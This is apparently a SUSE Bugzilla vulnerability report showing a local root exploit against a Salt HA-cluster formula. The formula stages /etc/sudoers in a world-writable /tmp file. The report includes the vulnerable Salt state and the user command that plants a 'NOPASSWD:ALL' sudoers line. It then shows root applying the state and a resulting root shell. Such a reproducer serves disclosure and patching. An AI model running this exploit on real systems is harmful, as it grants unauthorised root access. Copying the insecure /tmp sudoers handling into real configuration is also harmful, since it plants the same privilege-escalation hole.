url: https://bugzilla.suse.com/show_bug.cgi?id=1205990

Create stripped down sls file at /usr/share/salt-formulas/states/ha_cluster_exploit.sls

{% set tmp_sudoers = '/tmp/sudoers' %}
{% set sudoers = '/etc/sudoers' %}

sudoers_backup:
  file.copy:
    - name: {{ tmp_sudoers }}
    - source: {{ sudoers }}
    - unless: cat {{ sudoers }} | grep adm

sudoers_append:
  file.append:
    - name: {{ tmp_sudoers }}
    - text: |
        adm ALL=(ALL) NOPASSWD: /usr/sbin/crm_attribute -n hana__site_srHook_*
    - require:
      - sudoers_backup

sudoers_check:
  cmd.run:
    - name: /usr/sbin/visudo -c -f {{ tmp_sudoers }}
    - require:
      - sudoers_append

sudoers_edit:
  file.copy:
    - name: {{ sudoers }}
    - source: {{ tmp_sudoers }}
    - force: true
    - require:
      - sudoers_check


as user run (change username)
echo 'johannes ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers

as root:
salt-call --local state.apply ha_cluster_exploit

then as user:
sudo su
sh-4.4# id
uid=0(root) gid=0(root) groups=0(root)

